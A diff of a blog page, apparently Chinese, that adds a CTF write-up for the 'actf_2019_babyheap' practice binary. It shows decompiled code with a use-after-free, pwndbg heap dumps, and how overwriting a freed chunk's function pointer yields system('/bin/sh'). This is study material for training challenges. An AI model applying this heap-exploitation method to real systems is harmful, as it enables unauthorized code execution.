@@ -379,21 +379,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-11-14
+                    2023-11-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.7k
+                    6.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    30 分
+                    35 分
                 </div>
                 
 
@@ -1511,6 +1511,184 @@ empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
    0x7ffff7afd2d9    mov    rax, qword ptr [rsp + 0x20]
    0x7ffff7afd2de    mov    qword ptr [rsp + 0x60], rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#actf_2019_babyheap">actf_2019_babyheap</a></h2><p>检查保护：没开地址随机化</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  actf_2019_babyheap  checksec pwn         
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/actf_2019_babyheap/pwn'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x3ff000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>分析函数：</p>
+<p>就是简单的增删查功能，其中删除功能中存在<code>UAF</code>漏洞</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( v1 &gt;&#x3D; 0 &amp;&amp; v1 &lt; count )
+  &#123;
+    if ( ptr[v1] )
+    &#123;
+      free((void *)ptr[v1]-&gt;content_ptr);
+      free(ptr[v1]);                            &#x2F;&#x2F; vuln
+    &#125;
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>并且程序中存在<code>system</code>和<code>/bin/sh</code></p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt.got:00000000004007A0                               ; int system(const char *command)
+.plt.got:00000000004007A0                               system proc near                        ; CODE XREF: menu+7B↓p
+.plt.got:00000000004007A0 FF 25 0A 18 20 00             jmp     cs:system_ptr
+.plt.got:00000000004007A0
+.plt.got:00000000004007A0                               system endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.data:0000000000602010 2F                            db  2Fh <span class="token punctuation">;</span> /
+.data:0000000000602011 <span class="token number">62</span>                            db  62h <span class="token punctuation">;</span> b
+.data:0000000000602012 <span class="token number">69</span>                            db  69h <span class="token punctuation">;</span> i
+.data:0000000000602013 6E                            db  6Eh <span class="token punctuation">;</span> n
+.data:0000000000602014 2F                            db  2Fh <span class="token punctuation">;</span> /
+.data:0000000000602015 <span class="token number">73</span>                            db  73h <span class="token punctuation">;</span> s
+.data:0000000000602016 <span class="token number">68</span>                            db  68h <span class="token punctuation">;</span> h
+.data:0000000000602017 00                            db    <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建堆的逻辑：先创建一个堆管理用于存储<code>printf</code>函数和保存堆内容的堆的地址，再根据长度创建一个存储堆内容的堆</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>heap <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>func <span class="token operator">=</span> print<span class="token punctuation">;</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        v0 <span class="token operator">=</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        v0<span class="token operator">-></span>content_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">++</span>count<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查的逻辑：调用堆管理中的<code>printf</code>，传递参数为堆管理中的堆指针中的内容</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">if ( v1 &gt;&#x3D; 0 &amp;&amp; v1 &lt; count )
+  &#123;
+    if ( ptr[v1] )
+      (*(void (__fastcall **)(__int64))&amp;ptr[v1]-&gt;func)(ptr[v1]-&gt;content_ptr);
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因此只需要想办法让<code>show</code>函数这里的<code>content_ptr</code>改成<code>/bin/sh</code>的地址，让<code>func</code>改成<code>system</code>的地址即可</p>
+<p>构造：由于存在<code>UAF</code>漏洞，即释放的堆管理地址仍然存在，所以在<code>show</code>的时候仍然可以利用释放过的堆，而控制堆管理则需要分析堆的创建过程:创建一个<code>0x20</code>的堆和一个指定大小的堆</p>
+<p>那么创建两个大小大于<code>0x20</code>的堆时释放它们的时候它们的堆管理都进入<code>fast bin</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
+Allocated chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x2207000
+Size: 0x250 <span class="token punctuation">(</span>with flag bits: 0x251<span class="token punctuation">)</span>
+
+Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x2207250
+Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>
+fd: 0x00
+
+Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x2207270
+Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>
+fd: 0x00
+
+Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x22072e0
+Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>
+fd: 0x2207260
+
+Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x2207300
+Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>
+fd: 0x2207280
+
+Top chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x2207370
+Size: 0x20c90 <span class="token punctuation">(</span>with flag bits: 0x20c91<span class="token punctuation">)</span>
+
+pwndbg<span class="token operator">></span> bin
+tcachebins
+0x20 <span class="token punctuation">[</span>  <span class="token number">2</span><span class="token punctuation">]</span>: 0x22072f0 —▸ 0x2207260 ◂— 0x0
+0x70 <span class="token punctuation">[</span>  <span class="token number">2</span><span class="token punctuation">]</span>: 0x2207310 —▸ 0x2207280 ◂— 0x0
+fastbins
+empty
+unsortedbin
+empty
+smallbins
+empty
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时创建一个<code>0x20</code>的堆，其中堆管理和实际输入内容的堆大小都是<code>0x20</code>，两个堆都是从之前释放的<code>fast bin</code>中取值，而<code>fast bin</code>中原先存在的两个堆就是用于管理的堆。因此创建一个<code>0x20</code>的堆之后可控的那个堆必然在其中一个堆管理的地址上，此时控制了<code>func</code>和<code>content_ptr</code>地址的内容再去<code>show</code>即可执行<code>system(&#39;/bin/sh&#39;)</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
+Allocated chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x1e2a000
+Size: 0x250 <span class="token punctuation">(</span>with flag bits: 0x251<span class="token punctuation">)</span>
+
+Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x1e2a250
+Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>
+fd: 0x00
+
+Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x1e2a270
+Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>
+fd: 0x00
+
+Allocated chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x1e2a2e0
+Size: 0x20 <span class="token punctuation">(</span>with flag bits: 0x21<span class="token punctuation">)</span>
+
+Free chunk <span class="token punctuation">(</span>tcachebins<span class="token punctuation">)</span> <span class="token operator">|</span> PREV_INUSE
+Addr: 0x1e2a300
+Size: 0x70 <span class="token punctuation">(</span>with flag bits: 0x71<span class="token punctuation">)</span>
+fd: 0x1e2a280
+
+Top chunk <span class="token operator">|</span> PREV_INUSE
+Addr: 0x1e2a370
+Size: 0x20c90 <span class="token punctuation">(</span>with flag bits: 0x20c91<span class="token punctuation">)</span>
+
+pwndbg<span class="token operator">></span> x/20gx 0x1e2a2e0
+0x1e2a2e0:	0x0000000000000000	0x0000000000000021
+0x1e2a2f0:	0x0000000001e2a260	0x000000000040098a
+0x1e2a300:	0x0000000000000000	0x0000000000000071
+0x1e2a310:	0x0000000001e2a280	0x0000000000000000
+0x1e2a320:	0x0000000000000000	0x0000000000000000
+0x1e2a330:	0x0000000000000000	0x0000000000000000
+0x1e2a340:	0x0000000000000000	0x0000000000000000
+0x1e2a350:	0x0000000000000000	0x0000000000000000
+0x1e2a360:	0x0000000000000000	0x0000000000000000
+0x1e2a370:	0x0000000000000000	0x0000000000020c91
+pwndbg<span class="token operator">></span> x/20gx 0x000000000040098a
+0x40098a:	0x20ec8348e5894855	0x048b4864e87d8948
+0x40099a:	0x4589480000002825	0x48e8458b48c031f8
+0x4009aa:	0xb800400e68bfc689	0xfffdede800000000
+0x4009ba:	0x4864f8458b4890ff	0x7400000028250433
+0x4009ca:	0xc3c9fffffdc0e805	0x10ec8348e5894855
+0x4009da:	0x00002825048b4864	0xbfc031f845894800
+0x4009ea:	0xfffd95e800400e80	0x8be800400ea0bfff
+0x4009fa:	0x00400e80bffffffd	0x0ec0bffffffd81e8
+0x400a0a:	0xbffffffd77e80040	0xfffd6de800400ee0
+0x400a1a:	0x63e800400f00bfff	0x00400f20bffffffd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"> 0x400cec    mov    edx, dword ptr [rbp - 0x24]
+  0x400cef    movsxd rdx, edx
+  0x400cf2    mov    rdx, qword ptr [rdx*8 + 0x602060]
+  0x400cfa    mov    rdx, qword ptr [rdx]
+  0x400cfd    mov    rdi, rdx
+► 0x400d00    call   rax                           &lt;system@plt&gt;
+       command: 0x602010 ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;
+
+  0x400d02    mov    rax, qword ptr [rbp - 8]
+  0x400d06    xor    rax, qword ptr fs:[0x28]
+  0x400d0f    je     0x400d16                      &lt;0x400d16&gt;
+
+  0x400d11    call   __stack_chk_fail@plt                      &lt;__stack_chk_fail@plt&gt;
+
+  0x400d16    leave  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -1853,7 +2031,7 @@ empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">53.1k</span>&nbsp;字
+                class="white-color">54k</span>&nbsp;字
             
             
             
